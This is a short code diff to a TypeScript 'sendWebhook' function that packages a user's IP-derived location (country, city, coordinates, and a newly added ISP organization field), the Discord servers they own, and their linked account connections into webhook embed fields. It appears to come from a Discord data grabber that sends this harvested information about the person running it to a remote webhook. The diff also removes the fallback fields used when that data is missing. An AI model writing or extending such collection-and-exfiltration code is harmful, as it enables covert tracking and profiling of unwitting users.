@@ -28,7 +28,7 @@ export const sendWebhook = async (
           },
           {
             name: "🌎 Location",
-            value: `Country: \`${ipInfo.country}\`\nCity, Region: \`${ipInfo.city}, ${ipInfo.region}\`\nLocation: \`${ipInfo.loc}\`\nMoreInfo: [Click here](https://ipinfo.io/${ipInfo.ip})`,
+            value: `Country: \`${ipInfo.country}\`\nCity, Region: \`${ipInfo.city}, ${ipInfo.region}\`\nLocation: \`${ipInfo.loc}\`\nOrganization: \`${ipInfo.org}\`\nMoreInfo: [Click here](https://ipinfo.io/${ipInfo.ip})`,
             inline: false
           }
         ];
@@ -39,24 +39,12 @@ export const sendWebhook = async (
             value: ownGuilds.map((guild) => `${guild.name} (${guild.id})`).join("\n"),
             inline: false
           });
-        } else {
-          fields.push({
-            name: "🧑‍💻 Joined Servers",
-            value: "Couldn't get server infomation",
-            inline: false
-          });
         }
 
         if (Array.isArray(connections) && connections.length > 0) {
           fields.push({
             name: "🎮 Connections",
             value: connections.map((connection) => `${connection.type}: ${connection.name}`).join("\n"),
-            inline: false
-          });
-        } else {
-          fields.push({
-            name: "🎮 Connections",
-            value: "Couldn't get connection infomation",
             inline: false
           });
         }
